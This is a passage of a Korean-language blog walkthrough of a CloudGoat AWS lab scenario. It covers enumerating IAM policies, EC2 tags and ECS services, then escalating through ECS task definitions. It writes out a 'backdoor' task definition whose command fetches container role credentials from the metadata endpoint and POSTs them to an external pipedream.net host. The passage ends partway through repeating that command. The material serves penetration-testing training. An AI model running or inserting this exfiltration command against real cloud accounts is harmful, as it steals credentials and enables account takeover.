720w,\n/static/5fa855396f46d52b2e9e4cf0bc675825/e996b/21.png 1050w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>전체적으로 구성이 완료된다면 해당 IAM 권한들에 대해서 나열이 가능하며 AWS 관리형 정책과 <code class=\"language-text\">cg-ec2-ruse-policy-cgid</code> 를 성생한 다른 사용자들의 두 가지 정책을 확인할 수  있었고 해당 사용자 지정 정책을 확인하고자 <code class=\"language-text\">arn:aws:iam::&lt;USERID>:policy/cg-ec2-ruse-role-policy-ecs_efs_attack_cgidzng5qpdu9q</code> 해당 리소스 정보에 대한 정책 버전 정보를 나열하였습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 38.888888888888886%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0UlEQVQoz52SSQ+CMBCFB3AXSws27ALictDgwXjx5P//U890xDUxUQ6vyetMv850SmmxQbLYwBUpZl7GckXS+pukX8BTOYTM2AuZP2IqKNtzKYZjDZq6CfLFDjpaYSYzOH0fZAmQ7T316b/ELEeCzIaBlHWDctlg4sbs7Z7qJOLFEgzbN2dubTDSfFt3oO2hqg84ni4I4/Ub7Bew5TxziWzTsoIOa8TpFioo/q7uns9AM6Uo2fLk+sM5v59RVyjN4xJRvoKvK/4qRr1B8BfwtcIrUuC2ApI+J0gAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/94f62141f12d1df12f3a5614f9aebfc6/37523/22.png\"\n        srcset=\"/static/94f62141f12d1df12f3a5614f9aebfc6/e9ff0/22.png 180w,\n/static/94f62141f12d1df12f3a5614f9aebfc6/f21e7/22.png 360w,\n/static/94f62141f12d1df12f3a5614f9aebfc6/37523/22.png 720w,\n/static/94f62141f12d1df12f3a5614f9aebfc6/302a4/22.png 1080w,\n/static/94f62141f12d1df12f3a5614f9aebfc6/07a9c/22.png 1440w,\n/static/94f62141f12d1df12f3a5614f9aebfc6/44d59/22.png 1553w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token string\">\"Sid\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"VisualEditor0\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"Effect\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"Allow\"</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"Action\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                        <span class=\"token string\">\"ecs:Describe*\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ecs:List*\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ecs:RegisterTaskDefinition\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ecs:UpdateService\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"iam:PassRole\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"iam:List*\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"iam:Get*\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ec2:CreateTags\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ec2:DescribeInstances\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ec2:DescribeImages\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ec2:DescribeTags\"</span><span class=\"token punctuation\">,</span>\n                        <span class=\"token string\">\"ec2:DescribeSnapshots\"</span>\n                    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"Resource\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"*\"</span></code></pre></div>\n<ul>\n<li>허용 가능한 정책들을 확인해보면 다음과 같은 형태의 자원들에 대하여 ecs, iam, ec2등 쓰기, 읽기 권한이 부여되있는 것을 확인할 수 있습니다</li>\n<li>해당 권한중 환경을 수정할 수 있는 <code class=\"language-text\">ecs:RegisterTaskDefinition</code>, <code class=\"language-text\">ecs:UpdateService</code>, <code class=\"language-text\">ec2:createTags</code> 권한들을 이용할 방법을 구색하였습니다.</li>\n</ul>\n<h3 id=\"ecs-클러스터-정보와-동작중인-서비스-나열\" style=\"position:relative;\"><a href=\"#ecs-%ED%81%B4%EB%9F%AC%EC%8A%A4%ED%84%B0-%EC%A0%95%EB%B3%B4%EC%99%80-%EB%8F%99%EC%9E%91%EC%A4%91%EC%9D%B8-%EC%84%9C%EB%B9%84%EC%8A%A4-%EB%82%98%EC%97%B4\" aria-label=\"ecs 클러스터 정보와 동작중인 서비스 나열 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ECS 클러스터 정보와 동작중인 서비스 나열</h3>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ec2 describe<span class=\"token operator\">-</span>instances <span class=\"token operator\">-</span><span class=\"token operator\">-</span>query <span class=\"token string\">'Reservations[*].Instances[*].[Tags]'</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 70.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAAAsTAAALEwEAmpwYAAABOElEQVQ4y52T2XaDMAxEDYQtLMbGYEIasjX9/z+cHomYQrqE9EFHWOBrjcaIQvco9A6ZtNiWHbK8RyHfINWAsjogK3rOlT5ypjpFIffwggr+Ri1CcDFQCEKNJLXY5h2ipIHwSghPQvhyzG7NueQ6AWj/HCxcMUwMtDmhsVc09h1hbL6d/hg/djgBYwNVj0C7u7HstZBfgTQbVR+hzIlH4KQ5uQ72F1S4GRCwbi6w/cdkBg2eggyR6rCuQ+pkE9UcUWIQpy2bQge4oDW9WwUcNxgEoRqliTFc5xx+tZD7VDI9EJikmfaCujnfBywngHt+OkP3AXVZ6YHnmJf9g9wGadaxUS+5rM0ZbXdDNzMmL/dsiL47/xKQJJPc6dr4yz9l9bX5muHAQCf7XxebQHRl5h3NHV4DmQM/ASlLOSXFCzWnAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/880ee0505eb5cb036d69d34c8d43d019/37523/23.png\"\n        srcset=\"/static/880ee0505eb5cb036d69d34c8d43d019/e9ff0/23.png 180w,\n/static/880ee0505eb5cb036d69d34c8d43d019/f21e7/23.png 360w,\n/static/880ee0505eb5cb036d69d34c8d43d019/37523/23.png 720w,\n/static/880ee0505eb5cb036d69d34c8d43d019/302a4/23.png 1080w,\n/static/880ee0505eb5cb036d69d34c8d43d019/b9024/23.png 1203w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>읽기 권한을 이용해서 해당 서버의 인스턴스를 나열한 결과들중에서 <code class=\"language-text\">tag</code> 기점으로 쿼리하여 <code class=\"language-text\">admin</code>, <code class=\"language-text\">cg-ruse-ec2</code> 두개의 ec2 인스턴스가 있는 것을 확인할 수있 습니다.</li>\n<li>해당 인스턴스의 구성을 분석해보면 액세스할 수 있는 <code class=\"language-text\">StartSession</code> 태그가 부여된 것을 확인할 수있습니다.</li>\n<li><code class=\"language-text\">cg-ruse-ec2</code> 에서는 true로 설정되어 있고 <code class=\"language-text\">admin</code> 에서는 false로 설정되어 있기 때문에 해당 태그가 어떤 역활을 하는지는 아직 모르기 때문에 좀더 분석을 진행해야 합니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.333333333333336%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAArklEQVQY04WP22rCQBRF05o4iakd55qT6aiJtlH6//+3SgaEFoQ+LNZmP5zDrvYmUStD01pU72n7gXY3oLpY3PXC7k14rQ0vm8O/VE5O5PlGOi+ENKHdEeMmtDkVu3DB+olGeTaNpd66wtOsHFXbCVEWUv7G+Qvv+sheZ4w7E+WLKJ8luzCX448Ha7faxythuCJpYfy4U1nJ6Diiw4gdM05mtir8mfGY+3v2mp/xA0JRXoNynGNEAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/6b6e13ce3baebe57b6910446185bef18/37523/24.png\"\n        srcset=\"/static/6b6e13ce3baebe57b6910446185bef18/e9ff0/24.png 180w,\n/static/6b6e13ce3baebe57b6910446185bef18/f21e7/24.png 360w,\n/static/6b6e13ce3baebe57b6910446185bef18/37523/24.png 720w,\n/static/6b6e13ce3baebe57b6910446185bef18/77800/24.png 855w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>ECS 서비스에 대한 클러스터를 나열한 결과 다음과 같이 해당 클러스터에 대한 리소스 정보를 확인할 수 있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 35.55555555555556%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAAAsTAAALEwEAmpwYAAABG0lEQVQoz22Qa0+DQBBFoUXeLMuzy6uFItKatAYN+snE+P//0zUzZpNq+uFmZx9zOIwRCAXVTiiqETI9IC+PnCQ7IM0HJFnPa6keUaoJQrbwwwqhqBEnHWw3h7GJYW4lx4hkDZE2cPwcjlfCDxU3UO36O669UCGICNIgiGp+QzCC017Iju82VgJj+5Cw0fi0oO7OOAwX1O0J/fGKcVpQNTMbpnmPrBjYkt5HccuWBJLpnj/KhoYR8cHr+oVpfoMXKNhuwSsZkimFzrSx45fcTEa3+QWagg3Wj2/045VnR80aoIFU8y+ZgmemAbfhe7qkx6fnd7wsn5jPK8+FINqS4gU7WHb6x+auoS7ycsR+uPCsLDtji//RkHswnR+G1qaqW+XlMwAAAABJRU5ErkJggg=='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/2d34fa6a8baa4c6f692bf9e4e42cc175/37523/25.png\"\n        srcset=\"/static/2d34fa6a8baa4c6f692bf9e4e42cc175/e9ff0/25.png 180w,\n/static/2d34fa6a8baa4c6f692bf9e4e42cc175/f21e7/25.png 360w,\n/static/2d34fa6a8baa4c6f692bf9e4e42cc175/37523/25.png 720w,\n/static/2d34fa6a8baa4c6f692bf9e4e42cc175/302a4/25.png 1080w,\n/static/2d34fa6a8baa4c6f692bf9e4e42cc175/07a9c/25.png 1440w,\n/static/2d34fa6a8baa4c6f692bf9e4e42cc175/07d7d/25.png 1478w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>해당 리소스를 이용하여 서비스를 나열한 결과 <code class=\"language-text\">cg-webapp-cgid</code> 가 있는 것을 확인할 수있습니다.</li>\n</ul>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 12.222222222222221%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAACCAYAAABYBvyLAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAXElEQVQI14WKSQqAMBAEox6MWcchJCbu+P83tqAe9OShqSpoEfOBkHY4HmFpgqMZHDYQr5f7fgHxAqkS2i5eVCZ/utMDpLpdSB2h7ADjC7Qrr0N6/GbVEETtf3cC56kuasK5rPgAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/fdec6bd0428da90df8fd74bff1b111ee/37523/26.png\"\n        srcset=\"/static/fdec6bd0428da90df8fd74bff1b111ee/e9ff0/26.png 180w,\n/static/fdec6bd0428da90df8fd74bff1b111ee/f21e7/26.png 360w,\n/static/fdec6bd0428da90df8fd74bff1b111ee/37523/26.png 720w,\n/static/fdec6bd0428da90df8fd74bff1b111ee/302a4/26.png 1080w,\n/static/fdec6bd0428da90df8fd74bff1b111ee/fbf76/26.png 1252w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li><code class=\"language-text\">descibe-services</code>로 서비스를 정의한 결과를 나열하고 해당 데이터를 확인해보면 <code class=\"language-text\">webapp:1</code>을 사용하여 실행 중인 single container를 확인할 수 있습니다. 다음 EC2 정책을 기준으로 ECS Task Definition 대한 쓰기 권한이 제한되어 있기 때문에 해당 방법을 통해서 공격 흐름을 진행합니다.</li>\n</ul>\n<h3 id=\"ecs-권한-상승\" style=\"position:relative;\"><a href=\"#ecs-%EA%B6%8C%ED%95%9C-%EC%83%81%EC%8A%B9\" aria-label=\"ecs 권한 상승 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ECS 권한 상승</h3>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 56.666666666666664%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAAC2ElEQVQoz42TS2xMURjHTzudO1qq03m199WZOfec75x777znjtFqaAkiYiWjBCuPhURbbKSJCBFrLLCRPiitPrQJiYRQ4hELEVKKEF1JaD2aKpqIK1PFwoLFL798yZcv+f+TDyEvcgrgrnGDaNm2jcq8Za6qYHCuqqolqlr13yiKWizL8hy0A+fm9mVPLmnJNNVb9dWxTNQqQwih0mKHowihQsc/yO8ghAoDfq9TUZRidNy4GX+117a7Nt4apXHWE49aWzTCF2GNLcWE1WmU/wGMOgzmX2hgLMMEaGVFQEDb9Hvi4Y1vLzQsOXK7SpOPAo+cwoS16Wa0FbjZTkDvoEzvyJsx3s45awMGebcDgzbOWSswfk6jPOcqQIVouNFGyIl0JaxeCojBkRDmw0Y0NeyrUEfUELkL3DxDQO+kzOiUwsnzvqDVJ5MFvV413TvjKqtHwYkBYDyHZuMXJGILMiHMbziE8mndzEzXLl751VXs/17uk1/qZrQDgJ2WcbI7tv3G+6X7nkypG4YmVx96Oik3XJtccfD5J33zxQ8BUVvXsgEV5PsvYLqRDmK4XiR4vnAj87mmdvlUyTzxm9sjvTAi8X7O+YBEs5fjWx/bq1re2ErDQ3vtgXFbyj2w1+x/Z+ub7toeCRqGfh0EpqfDGrvq9sqvmZ4YS6QWjgcqw2MVYvARM6IdGiHtQZrqcla3jjmqz04400c+ivXHPhalj35w1HRPCNkT45iaufk/IyOECcsCN69owO5w3XiWSlujQazdZ0ZkSKO8NxJL9ieSVn+YJS+EeHYQc2swxNI/zbMDmCcvEcrWz3RYIqBCTIATyndplDdTZjZRZjYS0JvzMyasKZZI7UpZ2d2E0iYA2kiBNgLArMlOCmyPRnmtr7y0CCmK4pIk0RUI+IWA3yf4vJ7f9vt9gqrIAkIoj9OvRgS3FBfcoimU55EigluOCx6RC2JlhSv/KT8ALwXQbCecVOIAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"./M34.png\"\n        title=\"./M34.png\"\n        src=\"/static/a37289c2fd4ff80fdea291567c0a6570/37523/M34.png\"\n        srcset=\"/static/a37289c2fd4ff80fdea291567c0a6570/e9ff0/M34.png 180w,\n/static/a37289c2fd4ff80fdea291567c0a6570/f21e7/M34.png 360w,\n/static/a37289c2fd4ff80fdea291567c0a6570/37523/M34.png 720w,\n/static/a37289c2fd4ff80fdea291567c0a6570/302a4/M34.png 1080w,\n/static/a37289c2fd4ff80fdea291567c0a6570/07a9c/M34.png 1440w,\n/static/a37289c2fd4ff80fdea291567c0a6570/ccef8/M34.png 3437w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>Elastic Container Services(ECS) Container는 orchestration 을 구현하는 AWS 서비스들 중 하나 입니다.</li>\n<li>ECS는 Cluster, Service, Task 해당 3가지 주요 부분으로 구성되며 Cluster는 ECS에서 가장 높은 수준의 추상화 방법입니다.</li>\n<li>Cluster는 Simple Task, Service Group이며 Service는 하나 이상의 Container로 구성될 수 있는 Running to Long time Task입니다.</li>\n<li>Task는 Task Definition에 의해 정의된 Running중인 Container입니다.</li>\n<li>EC2, Fargate의 두 가지 작업 배포 Type이 있습니다.</li>\n<li>EC2에 Task을 배포하려면 Instance 설정이 필요하지만 Fargate를 사용하면 전용 인스턴스 없이 배포가 가능합니다.</li>\n</ul>\n<h3 id=\"ecs-backdoor\" style=\"position:relative;\"><a href=\"#ecs-backdoor\" aria-label=\"ecs backdoor permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ECS Backdoor</h3>\n<ul>\n<li>앞서 구한 Task Definition의 <code class=\"language-text\">webapp:1</code> 을 사용해서 Single Task 를 포함하는 하나의 서비스가 배포되는 것을 알수 있었습니다.</li>\n<li>ECS 권한을 사용하여 해당 Task Definition를 수정한 다음에 서비스를 업데이트를 하여 새로운 업데이트 버전을 사용할 수 있도록 지시가 가능합니다.</li>\n<li>Task Definition에서 Backdoor를 생성하려면 먼저 현재 Task Definition을 다운로드 하고 수정을 해야 합니다.</li>\n<li>Backdoor를 만들기 위한 정보가 필요합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\">aws ecs describe<span class=\"token operator\">-</span>task<span class=\"token operator\">-</span>definition <span class=\"token operator\">-</span><span class=\"token operator\">-</span>task<span class=\"token operator\">-</span>definition webapp<span class=\"token punctuation\">:</span><span class=\"token number\">1</span></code></pre></div>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 720px; \"\n    >\n      <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 18.88888888888889%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAECAYAAACOXx+WAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0klEQVQY00WO226DMBBEnaRVEwhgXDAY1mAbW0mTNsr//9xU3lTqw9HsTbMj5hhgvIMJDpO7omoItXzBdWtRScKxGNC0C6Raeac6h7KacK5nnjetxcdJQ9jtAk0es08gdwMtd0x0xWAS9BhZM6rz/KA4G5SVYbNjoVkzp3LE4V1BUEwYVw/jA8jfoMeEftjQDxGffWDTTgdOllNlU6kW1NKyueo973K9O0gItz1g6IKQngjxCRceWP0PY9c7FveNfDPbr1eCXQ2xb/7J/d9s/9biF/m0ZQKiT32pAAAAAElFTkSuQmCC'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"Untitled\"\n        title=\"Untitled\"\n        src=\"/static/df7b75cd730f3b38452b3be2cfa96f84/37523/27.png\"\n        srcset=\"/static/df7b75cd730f3b38452b3be2cfa96f84/e9ff0/27.png 180w,\n/static/df7b75cd730f3b38452b3be2cfa96f84/f21e7/27.png 360w,\n/static/df7b75cd730f3b38452b3be2cfa96f84/37523/27.png 720w,\n/static/df7b75cd730f3b38452b3be2cfa96f84/5caea/27.png 996w\"\n        sizes=\"(max-width: 720px) 100vw, 720px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n        decoding=\"async\"\n      />\n    </span></p>\n<ul>\n<li>현재 작업중인 task definition 정보를 추출하여 백도어를 제작할 때 필요한 파라미터를 적기 위해서 정보를 수집합니다.</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token punctuation\">{</span>\n    <span class=\"token string\">\"containerDefinitions\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token punctuation\">{</span>\n            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"webapp\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"image\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"python:latest\"</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"cpu\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"memory\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">128</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"memoryReservation\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">64</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"portMappings\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token punctuation\">{</span>\n                    <span class=\"token string\">\"containerPort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"hostPort\"</span><span class=\"token punctuation\">:</span> <span class=\"token number\">80</span><span class=\"token punctuation\">,</span>\n                    <span class=\"token string\">\"protocol\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"tcp\"</span>\n                <span class=\"token punctuation\">}</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"essential\"</span><span class=\"token punctuation\">:</span> true<span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"entryPoint\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token string\">\"sh\"</span><span class=\"token punctuation\">,</span>\n                <span class=\"token string\">\"-c\"</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"command\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n                <span class=\"token string\">\"/bin/sh -c \\\"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json &amp;&amp; curl -X POST -d @data.json https://ens65n00m5z9al9.m.pipedream.net \\\" \"</span>\n            <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"environment\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"mountPoints\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"volumesFrom\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"family\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"webapp\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"taskRoleArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"executionRoleArn\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"arn:aws:iam::&lt;USERID>:role/cg-ecs-role-ecs_efs_attack_cgidzng5qpdu9q\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"networkMode\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"awsvpc\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"volumes\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"placementConstraints\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"requiresCompatibilities\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n        <span class=\"token string\">\"FARGATE\"</span>\n    <span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"cpu\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"256\"</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string\">\"memory\"</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"512\"</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<ul>\n<li>다음과 같은 형태로 백도어 json 파일을 제작을 하는데 이때 중요한 파라미터 라인은</li>\n</ul>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token string\">\"command\"</span><span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span>\n <span class=\"token string\">\"/bin/sh -c \\\"curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI > data.json &amp;&amp; curl -X 